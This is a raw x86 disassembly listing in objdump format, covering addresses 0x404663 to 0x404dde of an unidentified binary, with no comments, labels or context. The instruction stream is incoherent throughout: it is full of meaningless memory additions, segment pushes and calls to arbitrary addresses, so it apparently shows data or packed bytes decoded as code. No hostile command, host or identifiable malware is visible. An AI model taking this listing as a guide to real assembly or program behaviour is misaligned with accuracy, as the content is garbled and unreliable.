  404663:	and    DWORD PTR [eax+0x8],eax
  404666:	xor    BYTE PTR [esi],dl
  404668:	add    BYTE PTR [ecx],cl
  40466a:	adc    DWORD PTR [ecx],ebx
  40466c:	or     al,0x81
  40466e:	add    ah,al
  404670:	add    BYTE PTR [eax],bl
  404672:	add    BYTE PTR [ebp-0x657de668],dl
  404678:	mov    al,ds:0x5c2a024
  40467d:	nop
  40467e:	mov    BYTE PTR [ebx],ah
  404680:	daa    
  404681:	push   edx
  404682:	cmp    BYTE PTR [ebx],al
  404684:	add    BYTE PTR [ebx],bl
  404686:	add    al,0xc4
  404688:	add    BYTE PTR [eax],cl
  40468a:	push   cs
  40468b:	mov    cl,0x9
  40468d:	push   eax
  40468e:	add    al,0x0
  404690:	add    cl,BYTE PTR [edx]
  404692:	mov    BYTE PTR [eax],bh
  404694:	mov    edi,0x72100120
  404699:	sbb    eax,0x20840008
  40469e:	and    BYTE PTR [ebp+0x1e128924],al
  4046a4:	xor    BYTE PTR [eax+0x40],cl
  4046a7:	inc    eax
  4046a8:	and    BYTE PTR [eax],al
  4046aa:	or     ch,BYTE PTR [eax]
  4046ac:	add    BYTE PTR [edx-0x2dd2bef0],0x18
  4046b3:	mov    al,ds:0x20840002
  4046b8:	ror    DWORD PTR [ebx-0x6df3497c],0x10
  4046bf:	adc    al,BYTE PTR [eax+eax*1]
  4046c2:	add    al,0x12
  4046c4:	inc    eax
  4046c5:	fs xchg esp,eax
  4046c7:	addr16 pop edx
  4046c9:	adc    BYTE PTR [eax],al
  4046cb:	adc    BYTE PTR [edx+0x4d1a4004],0x90
  4046d2:	inc    ebx
  4046d3:	call   DWORD PTR es:0x414b9c
  4046da:	mov    BYTE PTR [eax],al
  4046dc:	or     dl,BYTE PTR [ecx+0x11502026]
  4046e2:	add    DWORD PTR [eax],ebp
  4046e4:	add    BYTE PTR [ecx],dl
  4046e6:	arpl   WORD PTR [esp],ax
  4046e9:	or     al,0xa3
  4046eb:	push   edx
  4046ec:	or     BYTE PTR [edx+eax*2+0x22],al
  4046f0:	inc    edx
  4046f1:	add    BYTE PTR [edx],dh
  4046f3:	adc    BYTE PTR [ecx+ebp*4],dl
  4046f6:	and    BYTE PTR [eax+0x60],al
  4046f9:	add    BYTE PTR [ecx],0x80
  4046fc:	add    al,BYTE PTR [ecx]
  4046fe:	sub    al,dl
  404700:	mov    eax,ds:0x21020040
  404705:	xor    DWORD PTR [edx],eax
  404707:	shr    BYTE PTR [eax+0x41],1
  40470a:	adc    eax,0x31195401
  40470f:	sub    BYTE PTR [ecx-0x6fa3ee8f],al
  404715:	xchg   DWORD PTR [ebx],esp
  404717:	nop
  404718:	add    BYTE PTR [ecx+0x42],al
  40471b:	dec    eax
  40471c:	add    DWORD PTR [ecx],edx
  40471e:	push   esp
  40471f:	add    al,0x0
  404721:	adc    BYTE PTR [edx],al
  404723:	add    DWORD PTR [eax+0x0],edx
  404726:	push   esp
  404727:	add    al,0x84
  404729:	inc    eax
  40472a:	adc    BYTE PTR [ebx],al
  40472c:	sbb    al,0x15
  40472e:	and    BYTE PTR [eax],al
  404730:	sub    BYTE PTR [ecx],bl
  404732:	pusha  
  404733:	sbb    dl,BYTE PTR [edx+0x1888c80]
  404739:	mov    ds:0x16a002c4,al
  40473e:	sbb    dl,BYTE PTR [eax]
  404740:	and    BYTE PTR [ecx+0x0],bl
  404743:	add    al,0x6c
  404745:	in     al,0x42
  404747:	push   eax
  404748:	add    DWORD PTR [ecx],eax
  40474a:	ret    0x400
  40474d:	pop    eax
  40474e:	add    BYTE PTR [ebp+eiz*2-0x3fff3e00],al
  404755:	mov    eax,0xe0842464
  40475a:	or     BYTE PTR [ecx],dh
  40475c:	pusha  
  40475d:	or     BYTE PTR [edx],al
  40475f:	adc    BYTE PTR [edx],0x68
  404762:	push   cs
  404763:	adc    DWORD PTR [ebx],eax
  404765:	push   cs
  404766:	add    BYTE PTR [eax],al
  404768:	inc    esp
  404769:	push   es
  40476a:	adc    al,bl
  40476c:	pushf  
  40476d:	enter  0x1000,0x80
  404771:	ror    BYTE PTR [edx],0xa0
  404774:	add    al,dl
  404776:	add    al,BYTE PTR [edx]
  404778:	and    BYTE PTR [eax],dl
  40477a:	add    edx,esp
  40477c:	jo     0x404709
  40477e:	dec    eax
  40477f:	add    BYTE PTR [edx],dl
  404781:	add    dl,BYTE PTR [esi+0xf91491]
  404787:	adc    BYTE PTR [edx],al
  404789:	lods   eax,DWORD PTR ds:[esi]
  40478a:	or     al,BYTE PTR [esp+eax*4]
  40478d:	mov    edx,DWORD PTR [eax+0x108010b8]
  404793:	add    BYTE PTR [ebx],dl
  404795:	inc    eax
  404796:	or     BYTE PTR [eax],dh
  404798:	adc    BYTE PTR [edx],ah
  40479a:	add    cl,BYTE PTR [ecx]
  40479c:	or     BYTE PTR [edx+0x4],al
  40479f:	add    BYTE PTR [edx],cl
  4047a1:	or     al,0xc1
  4047a3:	sub    BYTE PTR [eax],al
  4047a5:	adc    BYTE PTR [eax],0x4
  4047a8:	add    al,0x22
  4047aa:	or     BYTE PTR [edx+0x2000a900],al
  4047b0:	inc    eax
  4047b1:	adc    BYTE PTR [esi],cl
  4047b3:	aaa    
  4047b4:	and    BYTE PTR [edx+eax*4+0x20],cl
  4047b8:	and    BYTE PTR [eax],al
  4047ba:	add    ch,BYTE PTR [ebx-0x7df0f7ea]
  4047c0:	add    BYTE PTR [eax+0x80095d0],al
  4047c6:	adc    BYTE PTR [ebx],al
  4047c8:	test   DWORD PTR [eax-0x7c],eax
  4047cb:	call   0x854087d4
  4047d0:	or     dh,BYTE PTR [ecx]
  4047d2:	adc    BYTE PTR [eax-0x579fbe7d],dl
  4047d8:	add    al,BYTE PTR [eax]
  4047da:	sbb    al,0xe5
  4047dc:	add    BYTE PTR [eax],cl
  4047de:	mov    dl,BYTE PTR [eax-0x5fffffae]
  4047e4:	add    BYTE PTR [eax+eax*1],al
  4047e7:	imul   esi,DWORD PTR [eax],0x12411008
  4047ed:	add    al,0x2
  4047ef:	add    BYTE PTR [esi],al
  4047f1:	adc    eax,DWORD PTR [eax+0x1]
  4047f4:	add    BYTE PTR [edx],dl
  4047f6:	adc    al,0x28
  4047f8:	xor    BYTE PTR [eax],cl
  4047fa:	sub    BYTE PTR [ecx-0x77],al
  4047fd:	add    ecx,DWORD PTR [ebx]
  4047ff:	push   eax
  404800:	fild   DWORD PTR [ecx]
  404802:	shl    BYTE PTR [eax],0x1
  404805:	xor    BYTE PTR [ecx+0x2b],ah
  404808:	jg     0x40480a
  40480a:	and    BYTE PTR [edi],0xa3
  40480d:	and    BYTE PTR [eax],ch
  40480f:	add    al,0x4a
  404811:	inc    ebp
  404812:	nop
  404813:	and    dh,BYTE PTR [esi+0xa210840]
  404819:	and    al,0x0
  40481b:	xchg   edx,eax
  40481c:	or     al,BYTE PTR [eax+0x342085ac]
  404822:	add    BYTE PTR [eax],ch
  404824:	push   eax
  404825:	adc    BYTE PTR [eax],ah
  404827:	and    BYTE PTR [eax+0x20],al
  40482a:	add    BYTE PTR [eax],al
  40482c:	add    BYTE PTR [eax],ah
  40482e:	add    DWORD PTR [ecx],edx
  404830:	and    BYTE PTR [eax+0x4012001],cl
  404836:	add    BYTE PTR [edx+0x4],al
  404839:	add    BYTE PTR [eax+0x22],cl
  40483c:	fld    DWORD PTR [ebp-0x2a]
  40483f:	add    BYTE PTR ds:0xa3188a,al
  404845:	and    al,BYTE PTR [eax+0x2206a002]
  40484b:	adc    BYTE PTR [ebp-0x70],al
  40484e:	sbb    DWORD PTR [edx+0x20],0x2a40eb00
  404855:	pop    eax
  404856:	add    DWORD PTR [ecx+0x22],edx
  404859:	bound  eax,QWORD PTR [edx]
  40485b:	mov    al,ds:0x1320000a
  404860:	repnz and al,BYTE PTR [esi]
  404863:	and    dh,dl
  404865:	mov    eax,ds:0x13101d0
  40486a:	add    BYTE PTR [ecx],dl
  40486c:	add    BYTE PTR [eax],al
  40486e:	cwde   
  40486f:	add    DWORD PTR [eax+eax*2+0x4241221],edx
  404876:	add    BYTE PTR [ecx+0x31a300a],al
  40487c:	jo     0x4048b6
  40487e:	add    BYTE PTR [eax],al
  404880:	add    al,BYTE PTR [eax+0x48]
  404883:	inc    esp
  404884:	inc    ecx
  404885:	add    al,0x84
  404887:	inc    ebx
  404888:	xor    al,BYTE PTR [ecx]
  40488a:	loopne 0x40489c
  40488c:	inc    ecx
  40488d:	add    BYTE PTR [ecx-0x7dfc0000],al
  404893:	nop
  404894:	push   ss
  404895:	sbb    BYTE PTR [ecx+esi*1+0x402c44b3],ah
  40489c:	pusha  
  40489d:	add    dl,BYTE PTR [eax]
  40489f:	add    BYTE PTR [ecx],dl
  4048a1:	sbb    BYTE PTR [edx],al
  4048a3:	les    edx,FWORD PTR [edx+0x0]
  4048a6:	pop    ecx
  4048a7:	or     BYTE PTR [ebx+0x40e44],0xc2
  4048ae:	or     BYTE PTR [eax],ah
  4048b0:	add    DWORD PTR [eax],eax
  4048b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048b3:	inc    eax
  4048b4:	mov    al,0x20
  4048b6:	scas   al,BYTE PTR es:[edi]
  4048b7:	add    BYTE PTR [eax],0x9b
  4048ba:	cmp    BYTE PTR [edx+esi*1],0x8d
  4048be:	add    BYTE PTR [esi],al
  4048c0:	loopne 0x4048c8
  4048c2:	cdq    
  4048c3:	xor    BYTE PTR [eax],ah
  4048c5:	add    al,0x10
  4048c7:	xor    al,0x5
  4048c9:	and    al,0x15
  4048cb:	add    BYTE PTR [eax+0x8],0x21
  4048cf:	adc    al,BYTE PTR [edi]
  4048d1:	add    BYTE PTR [edx+0x10],al
  4048d4:	mov    eax,ds:0xb18024
  4048d9:	add    al,0x17
  4048db:	dec    esp
  4048dc:	push   cs
  4048dd:	ret    
  4048de:	push   cs
  4048df:	lds    ecx,FWORD PTR [eax+0x9a2072]
  4048e5:	adc    BYTE PTR [eax],ch
  4048e7:	inc    ecx
  4048e8:	or     BYTE PTR [eax],0x0
  4048eb:	add    BYTE PTR [eax],al
  4048ed:	or     BYTE PTR [eax],al
  4048ef:	bound  esp,QWORD PTR [eax+0x48]
  4048f2:	inc    edx
  4048f3:	pop    eax
  4048f4:	mov    ds:0x60504488,al
  4048f9:	adc    ah,BYTE PTR [ecx]
  4048fb:	and    BYTE PTR [ecx],cl
  4048fd:	and    BYTE PTR [eax],al
  4048ff:	popf   
  404900:	add    al,0xc0
  404902:	mov    ds:0x71260e18,eax
  404907:	xor    al,BYTE PTR [ecx]
  404909:	add    cl,dl
  40490b:	jp     0x40488d
  40490d:	dec    esi
  40490e:	adc    eax,DWORD PTR [eax-0x7257fcfc]
  404914:	xchg   al,al
  404916:	dec    eax
  404917:	dec    eax
  404918:	sub    DWORD PTR [ebx],esi
  40491a:	sbb    BYTE PTR [edx],cl
  40491c:	adc    cl,BYTE PTR [ecx+0x5a4d8000]
  404922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404923:	add    al,0xa0
  404925:	dec    eax
  404926:	mov    esi,DWORD PTR [eax+0x40004011]
  40492c:	pop    eax
  40492d:	sbb    al,0x10
  40492f:	add    BYTE PTR [eax],cl
  404931:	and    BYTE PTR [ebx],al
  404933:	add    DWORD PTR [eax+0x0],eax
  404936:	mov    al,ds:0x18096487
  40493b:	adc    eax,DWORD PTR [ecx]
  40493d:	or     BYTE PTR [eax+eax*1],al
  404940:	add    al,BYTE PTR [edx-0x18]
  404943:	push   eax
  404944:	xchg   edx,eax
  404945:	push   eax
  404946:	and    al,0x80
  404948:	add    BYTE PTR [esi+0x8],al
  40494b:	and    BYTE PTR [ecx-0x3f3d63f6],0x40
  404952:	or     BYTE PTR [edx],dh
  404954:	or     BYTE PTR [ecx-0x5e75dfea],al
  40495a:	or     dh,BYTE PTR [eax]
  40495c:	sub    al,dl
  40495e:	loope  0x4048e1
  404960:	or     BYTE PTR [edx],al
  404962:	inc    edx
  404963:	add    BYTE PTR [eax],0x10
  404966:	inc    eax
  404967:	xor    al,0x83
  404969:	add    BYTE PTR [eax+0xb881140],0x85
  404970:	and    BYTE PTR [esi+ebx*2],ah
  404973:	xor    BYTE PTR [esp+eax*1+0x45],al
  404977:	add    BYTE PTR [eax],ah
  404979:	xor    ah,BYTE PTR [edx-0x3d]
  40497c:	add    dl,BYTE PTR [eax+0x40]
  40497f:	sub    BYTE PTR [eax],dh
  404981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404982:	xor    al,0x15
  404984:	and    DWORD PTR [eax],eax
  404986:	xor    BYTE PTR [eax],cl
  404988:	xor    BYTE PTR [edx],0x35
  40498b:	and    BYTE PTR [edx+0x885a0],cl
  404991:	add    esi,eax
  404993:	and    BYTE PTR [eax+0x10],dl
  404996:	add    BYTE PTR [eax+0x2b],0x11
  40499a:	add    eax,DWORD PTR [eax]
  40499c:	push   cs
  40499d:	inc    ecx
  40499e:	add    ah,dl
  4049a0:	sbb    BYTE PTR [eax],al
  4049a2:	and    BYTE PTR [eax],dl
  4049a4:	add    BYTE PTR [edx],dl
  4049a6:	sub    eax,0xe4d80600
  4049ab:	or     BYTE PTR [eax+eax*1],al
  4049ae:	push   cs
  4049af:	add    BYTE PTR [eax+0x1],al
  4049b2:	or     cl,al
  4049b4:	inc    esp
  4049b5:	mov    al,0x10
  4049b7:	add    BYTE PTR [edx],dl
  4049b9:	add    al,0xa
  4049bb:	add    al,0x20
  4049bd:	sahf   
  4049be:	adc    DWORD PTR [eax+0x42],0x75487040
  4049c5:	add    dl,BYTE PTR [eax]
  4049c7:	or     dl,BYTE PTR [ecx]
  4049c9:	xchg   BYTE PTR [eax],dl
  4049cb:	adc    dh,BYTE PTR [ecx+eax*1+0x62ab692]
  4049d2:	nop
  4049d3:	inc    ecx
  4049d4:	dec    ecx
  4049d5:	xchg   edx,eax
  4049d6:	and    BYTE PTR [edx+0x180152],0x27
  4049dd:	or     BYTE PTR [edx+0xd998481],ah
  4049e3:	add    DWORD PTR [ecx],ebp
  4049e5:	add    BYTE PTR [esp+esi*1+0x31092022],ch
  4049ec:	mov    DWORD PTR [eax],0x4028000
  4049f2:	add    BYTE PTR [esp+edx*4],al
  4049f5:	add    eax,DWORD PTR [eax+eax*2+0x68]
  4049f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049fa:	add    BYTE PTR [ecx],dh
  4049fc:	push   ebp
  4049fd:	pusha  
  4049fe:	add    BYTE PTR [eax],dl
  404a00:	inc    ebx
  404a01:	mov    eax,DWORD PTR [edx+eax*4+0x1]
  404a05:	sbb    BYTE PTR [ebx+0x2a],al
  404a08:	mov    ah,0x0
  404a0a:	xchg   esp,eax
  404a0b:	inc    ecx
  404a0c:	or     cl,BYTE PTR [eax]
  404a0e:	sbb    DWORD PTR [eax],ecx
  404a10:	xor    BYTE PTR [eax+0x201031],al
  404a16:	sbb    eax,ecx
  404a18:	pusha  
  404a19:	pop    ebx
  404a1a:	or     BYTE PTR [eax+0x42008000],0x85
  404a21:	pop    ds
  404a22:	inc    esp
  404a23:	loop   0x4049a9
  404a25:	add    eax,DWORD PTR [eax]
  404a27:	test   BYTE PTR ss:[edx+0x403],al
  404a2e:	ror    BYTE PTR [eax+0x50110880],1
  404a34:	add    BYTE PTR [ecx+0x3],0x82
  404a38:	add    ch,al
  404a3a:	or     al,0x82
  404a3c:	inc    edx
  404a3d:	add    cl,BYTE PTR [edx]
  404a3f:	test   eax,0x311880df
  404a44:	add    BYTE PTR [eax],al
  404a46:	adc    DWORD PTR [eax],eax
  404a48:	add    eax,DWORD PTR [ecx+0x8]
  404a4b:	add    BYTE PTR [ebp-0x775fff60],al
  404a51:	add    eax,0x30060881
  404a56:	or     BYTE PTR [edx+0x32],al
  404a59:	add    edx,ecx
  404a5b:	add    al,0xa
  404a5d:	lods   al,BYTE PTR ds:[esi]
  404a5e:	aam    0xa0
  404a60:	push   es
  404a61:	sbb    al,0x2
  404a63:	jecxz  0x404a65
  404a65:	or     DWORD PTR [eax+eiz*2],esi
  404a68:	add    al,BYTE PTR [edx]
  404a6a:	xor    esp,eax
  404a6c:	push   eax
  404a6d:	sbb    BYTE PTR [ecx+0xc89808],al
  404a73:	add    DWORD PTR [ebx],eax
  404a75:	inc    eax
  404a76:	jo     0x404a78
  404a78:	xor    BYTE PTR [ebx],ah
  404a7a:	ins    BYTE PTR es:[edi],dx
  404a7b:	or     al,0x9
  404a7d:	and    DWORD PTR [eax+0x26102400],eax
  404a83:	xor    DWORD PTR [ecx],eax
  404a85:	xchg   ecx,eax
  404a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a87:	add    al,0x80
  404a89:	or     BYTE PTR [eax],dh
  404a8b:	mov    DWORD PTR [esi-0x7a],ecx
  404a8e:	add    BYTE PTR [eax],0x92
  404a91:	add    al,BYTE PTR [esi+0x456cb031]
  404a97:	inc    esp
  404a98:	pop    es
  404a99:	and    BYTE PTR [eax],al
  404a9b:	sbb    DWORD PTR [eax],0x18403281
  404aa1:	sbb    DWORD PTR [eax+0x2d1d22a5],ebp
  404aa7:	sbb    BYTE PTR [eax],al
  404aa9:	xor    BYTE PTR [edi],al
  404aab:	add    BYTE PTR [esi+0x30],dl
  404aae:	xor    BYTE PTR [eax+0x1408e403],0x11
  404ab5:	dec    ebx
  404ab6:	adc    dh,BYTE PTR [eax+0x1b014208]
  404abc:	xchg   ecx,eax
  404abd:	add    BYTE PTR [eax+0xa082110],al
  404ac3:	adc    BYTE PTR [edx+eiz*1+0x0],bl
  404ac7:	shr    BYTE PTR [eax],0x40
  404aca:	add    DWORD PTR [ebx],0x48
  404acd:	add    BYTE PTR [edx],ah
  404acf:	add    al,0x90
  404ad1:	adc    BYTE PTR [esp+eax*8],al
  404ad4:	inc    eax
  404ad5:	add    dl,BYTE PTR [eax]
  404ad7:	loopne 0x404b05
  404ad9:	sub    al,0x6
  404adb:	loopne 0x404a5f
  404add:	ret    0x4454
  404ae0:	inc    ecx
  404ae1:	adc    eax,0xe82563
  404ae6:	jo     0x404a7b
  404ae8:	add    BYTE PTR [ebx],cl
  404aea:	adc    BYTE PTR [eax+ecx*4],cl
  404aed:	push   eax
  404aee:	add    BYTE PTR [eax],0x40
  404af1:	add    al,0x62
  404af3:	and    al,0x0
  404af5:	add    DWORD PTR [eax-0x80],esi
  404af8:	adc    DWORD PTR [edx-0x60],ecx
  404afb:	inc    eax
  404afc:	or     al,0x44
  404afe:	test   BYTE PTR [edx+esi*2],cl
  404b01:	or     BYTE PTR [ecx],bl
  404b03:	inc    esi
  404b04:	add    dh,BYTE PTR [eax-0x7f]
  404b07:	add    BYTE PTR [eax-0x3dbebfdf],cl
  404b0d:	or     dl,BYTE PTR [eax+ebx*1+0x1]
  404b11:	les    eax,FWORD PTR [edx]
  404b13:	inc    ebx
  404b14:	add    BYTE PTR [eax],al
  404b16:	adc    bh,BYTE PTR [eax]
  404b18:	and    BYTE PTR [ecx+0x21],cl
  404b1b:	or     BYTE PTR [ebx-0x7cf977f7],cl
  404b21:	xor    BYTE PTR [ecx],ch
  404b23:	sbb    BYTE PTR [eax],dl
  404b25:	inc    eax
  404b26:	push   eax
  404b27:	add    BYTE PTR [eax],al
  404b29:	nop
  404b2a:	dec    ebp
  404b2b:	xchg   ecx,eax
  404b2c:	adc    BYTE PTR [ecx],al
  404b2e:	add    BYTE PTR [edx],dh
  404b30:	push   cs
  404b31:	or     BYTE PTR [eax],al
  404b33:	pusha  
  404b34:	add    BYTE PTR [eax],al
  404b36:	xor    BYTE PTR [esp+eax*2+0x40],al
  404b3a:	or     al,0xc0
  404b3c:	cmp    BYTE PTR [ecx+eax*1],al
  404b3f:	add    BYTE PTR [ebx-0x74],cl
  404b42:	add    BYTE PTR [ecx],al
  404b44:	sub    eax,0x4ac8156a
  404b49:	mov    al,0x4
  404b4b:	add    al,0xa
  404b4d:	and    DWORD PTR [eax],eax
  404b4f:	rol    BYTE PTR [ecx],0x14
  404b52:	adc    al,0x40
  404b54:	add    BYTE PTR [eax+ecx*2],ah
  404b57:	add    al,0x4
  404b59:	adc    dh,BYTE PTR [eax]
  404b5b:	jmp    0x404ae5
  404b5d:	add    al,al
  404b5f:	adc    BYTE PTR [esp+edx*4],dl
  404b62:	add    edx,eax
  404b64:	add    BYTE PTR [ebx-0x7d79fc00],al
  404b6a:	or     BYTE PTR [ebx+0x4113240a],al
  404b70:	add    BYTE PTR [eax],al
  404b72:	adc    eax,0x39
  404b75:	add    DWORD PTR [eax+edx*1],eax
  404b78:	or     al,0x4
  404b7a:	add    al,0x10
  404b7c:	mov    BYTE PTR ds:0x290006f0,bl
  404b82:	or     eax,DWORD PTR [edx]
  404b84:	and    ah,BYTE PTR [eax+0x8]
  404b87:	add    ch,BYTE PTR [ecx+0x19]
  404b8a:	add    BYTE PTR [ebx+0xc],ah
  404b8d:	add    BYTE PTR [eax+0xa],al
  404b90:	add    BYTE PTR [eax],dh
  404b92:	add    al,0xa2
  404b94:	inc    eax
  404b95:	inc    eax
  404b96:	push   eax
  404b97:	adc    BYTE PTR [eax],ah
  404b99:	test   BYTE PTR [ebp+0x4077442b],ah
  404b9f:	rcl    BYTE PTR [ebx+0x88126a3],0x40
  404ba6:	or     BYTE PTR [eax],0x38
  404ba9:	sub    BYTE PTR [eax+0x10],al
  404bac:	ror    BYTE PTR [eax],0x1a
  404baf:	adc    al,0x4a
  404bb2:	popa   
  404bb3:	or     BYTE PTR [eax+0x2],al
  404bb6:	add    BYTE PTR [ecx],dh
  404bb8:	add    dl,BYTE PTR [eax]
  404bba:	add    cl,BYTE PTR [eax]
  404bbc:	mov    al,ds:0xc0000012
  404bc1:	rol    BYTE PTR [ecx+eax*2],0xc0
  404bc5:	adc    dh,BYTE PTR [eax+eax*1]
  404bc8:	dec    edx
  404bc9:	add    eax,0xa88a0617
  404bce:	or     eax,0x21812090
  404bd3:	add    al,0x14
  404bd5:	adc    ah,BYTE PTR [edx+eiz*1+0x10029958]
  404bdc:	mov    al,ds:0x4891228
  404be1:	inc    esi
  404be2:	pop    ecx
  404be3:	popa   
  404be4:	inc    eax
  404be5:	adc    BYTE PTR [edx-0x27f1baf4],al
  404beb:	mov    DWORD PTR [eax+esi*1+0x53],eax
  404bef:	add    DWORD PTR [eax+0x7c],eax
  404bf2:	inc    eax
  404bf3:	xchg   edx,eax
  404bf4:	add    BYTE PTR [eax],0x20
  404bf7:	sbb    al,0x92
  404bf9:	mov    es,WORD PTR [eax]
  404bfb:	loopne 0x404c3e
  404bfd:	add    al,BYTE PTR [eax]
  404bff:	cwde   
  404c00:	push   eax
  404c01:	mov    edx,0x48426448
  404c06:	inc    ebx
  404c07:	rol    BYTE PTR [eax-0x7c],1
  404c0a:	adc    DWORD PTR [edi],ecx
  404c0c:	inc    eax
  404c0d:	and    BYTE PTR [eax+0x0],ah
  404c10:	add    eax,DWORD PTR [eax]
  404c12:	shl    BYTE PTR [ebx],0x30
  404c15:	mov    al,ds:0x1c800133
  404c1a:	fs add al,0x12
  404c1d:	add    BYTE PTR [ebx+0xd001010],dl
  404c23:	add    DWORD PTR [eax],ecx
  404c25:	or     cl,cl
  404c27:	push   ecx
  404c28:	mov    BYTE PTR [edi],ah
  404c2a:	add    BYTE PTR [eax],dl
  404c2c:	add    BYTE PTR [eax+0x0],ah
  404c2f:	add    BYTE PTR [ebx],al
  404c31:	adc    bl,BYTE PTR [eax]
  404c33:	add    ebp,DWORD PTR [ecx]
  404c35:	inc    edx
  404c36:	and    DWORD PTR [eax],ebx
  404c38:	or     DWORD PTR [ecx],ebp
  404c3a:	inc    ebx
  404c3b:	add    al,0x49
  404c3e:	add    eax,0x9801200
  404c43:	add    BYTE PTR [eax],al
  404c45:	add    al,BYTE PTR [eax]
  404c47:	rcr    DWORD PTR [eax+0x20],cl
  404c4a:	add    DWORD PTR [esi],edx
  404c4c:	sub    BYTE PTR [edx],al
  404c4e:	inc    esp
  404c4f:	add    ah,BYTE PTR [eax]
  404c51:	add    BYTE PTR es:0xc68d0f02,ch
  404c58:	sub    BYTE PTR [eax-0x7d],ah
  404c5b:	or     al,BYTE PTR [edx]
  404c5d:	adc    bl,bh
  404c5f:	sub    al,0x0
  404c61:	xchg   edx,eax
  404c62:	add    al,0x10
  404c64:	test   al,0x20
  404c66:	inc    eax
  404c67:	push   es
  404c68:	xchg   ecx,eax
  404c69:	dec    eax
  404c6a:	and    dl,BYTE PTR [eax]
  404c6c:	pop    ss
  404c6d:	or     BYTE PTR [eax+0x1a0030],al
  404c73:	add    BYTE PTR [eax+0xb109883],cl
  404c79:	add    BYTE PTR ds:0x28062258,dh
  404c7f:	in     eax,0x4
  404c81:	add    BYTE PTR [eax+0x51],cl
  404c84:	adc    BYTE PTR [ecx],0x88
  404c87:	add    al,0x5
  404c89:	inc    esp
  404c8a:	xor    al,0xab
  404c8c:	or     al,0x52
  404c8e:	add    bl,BYTE PTR [eax]
  404c90:	inc    ecx
  404c91:	ret    0xa00
  404c94:	or     BYTE PTR [ebx+esi*1],dl
  404c97:	shr    DWORD PTR [eax+0x40e80099],1
  404c9d:	or     DWORD PTR [eax+0x1110020b],0x40f04860
  404ca7:	rol    DWORD PTR [eax],0xed
  404caa:	push   edx
  404cab:	or     eax,0x860d401c
  404cb0:	inc    edx
  404cb1:	adc    eax,DWORD PTR [ecx]
  404cb3:	mov    ds:0x302123cc,al
  404cb8:	add    BYTE PTR [eax],cl
  404cba:	sbb    BYTE PTR [ecx],dl
  404cbc:	or     BYTE PTR [eax-0x7e],cl
  404cbf:	add    eax,0xa00120e
  404cc4:	xchg   ecx,eax
  404cc5:	dec    eax
  404cc6:	and    BYTE PTR [eax],al
  404cc8:	mov    al,ds:0x64080801
  404ccd:	add    BYTE PTR [edx+0x469268ac],al
  404cd3:	add    eax,0x811a6248
  404cd8:	cwde   
  404cd9:	sbb    BYTE PTR [ecx+0x10226040],cl
  404cdf:	xor    BYTE PTR [edx],al
  404ce1:	sub    BYTE PTR [ebp+0x2c],al
  404ce4:	add    DWORD PTR [eax+0x142808d7],esp
  404cea:	and    al,BYTE PTR [edx]
  404cec:	add    al,0x94
  404cee:	pusha  
  404cef:	inc    eax
  404cf0:	add    DWORD PTR [eax],esi
  404cf2:	inc    eax
  404cf3:	and    DWORD PTR [eax],ecx
  404cf5:	add    al,BYTE PTR [eax-0x58]
  404cf8:	add    BYTE PTR [eax+ecx*1],ah
  404cfb:	retf   0xa023
  404cfe:	add    cl,BYTE PTR [ecx]
  404d00:	nop
  404d01:	or     BYTE PTR [ecx],ah
  404d03:	add    esi,DWORD PTR [eax]
  404d05:	and    BYTE PTR [eax+0x4c],al
  404d08:	add    eax,0x1c108002
  404d0d:	inc    eax
  404d0e:	xchg   edx,eax
  404d0f:	or     ah,BYTE PTR [ecx+edx*4]
  404d12:	add    DWORD PTR [ecx],edx
  404d14:	or     DWORD PTR [ecx+0x531080],eax
  404d1a:	add    eax,0x103a16
  404d1f:	ss and eax,0x8002020e
  404d25:	add    DWORD PTR [edx],ecx
  404d27:	and    BYTE PTR [eax],0x80
  404d2a:	sbb    dh,BYTE PTR [eax]
  404d2c:	test   eax,0xc1ec02ba
  404d31:	inc    esp
  404d32:	and    DWORD PTR [eax+0x30],0x10
  404d36:	xor    BYTE PTR [eax-0x54],al
  404d39:	sub    BYTE PTR [eax+ebx*4+0x1080000],al
  404d40:	add    DWORD PTR [edx+0x4021141],0x50
  404d47:	inc    eax
  404d48:	mov    al,ds:0xcb201c00
  404d4d:	adc    BYTE PTR ds:0xc1610a1,ah
  404d53:	cmp    BYTE PTR [eax+eiz*2-0x80],bl
  404d57:	and    BYTE PTR [ecx],ah
  404d59:	ret    0x180
  404d5c:	or     BYTE PTR ds:0x7028364,ch
  404d62:	inc    ebp
  404d63:	add    cl,BYTE PTR [eax+ecx*1]
  404d66:	xor    al,0x8
  404d68:	add    BYTE PTR [ecx],dl
  404d6a:	inc    edx
  404d6b:	add    edx,DWORD PTR [edx]
  404d6d:	or     al,0x26
  404d6f:	inc    esp
  404d70:	add    BYTE PTR [esp+eax*4],cl
  404d73:	add    BYTE PTR [eax+0x30],cl
  404d76:	inc    esp
  404d77:	add    eax,eax
  404d79:	add    BYTE PTR [eax],dl
  404d7b:	and    DWORD PTR [edi+0x65490380],esp
  404d81:	bound  ecx,QWORD PTR [ecx]
  404d83:	or     BYTE PTR [eax-0x7dcff3c3],al
  404d89:	add    BYTE PTR [ecx],ch
  404d8b:	add    BYTE PTR [eax],cl
  404d8d:	mov    al,0x0
  404d8f:	mov    al,ds:0x4410a030
  404d94:	and    al,0x10
  404d96:	rcl    BYTE PTR [ecx+0x22650001],1
  404d9c:	add    BYTE PTR [edx+0x20],0x46
  404da0:	dec    eax
  404da1:	and    al,0x0
  404da3:	sub    ebp,DWORD PTR [eax+0x60d30093]
  404da9:	dec    eax
  404daa:	add    BYTE PTR [eax],al
  404dac:	mov    DWORD PTR [esi],eax
  404dae:	and    ecx,DWORD PTR [ebx]
  404db0:	popa   
  404db1:	add    eax,0xd4405a
  404db6:	pusha  
  404db7:	mov    ds:0x4040a038,al
  404dbc:	add    BYTE PTR [eax],dl
  404dbe:	adc    DWORD PTR [ecx-0x5c],eax
  404dc1:	add    BYTE PTR ds:0x84a8001e,cl
  404dc7:	mov    eax,ds:0x964006
  404dcc:	inc    ecx
  404dcd:	mov    BYTE PTR [ecx],al
  404dcf:	inc    eax
  404dd0:	push   eax
  404dd1:	xchg   DWORD PTR [edx],eax
  404dd3:	add    DWORD PTR [eax],ecx
  404dd5:	xor    DWORD PTR [ebx+0x2c0282a0],esp
  404ddb:	and    al,BYTE PTR [ecx+esi*8]
  404dde:	and    cl,BYTE PTR [ecx+ecx*4+0x1827082]
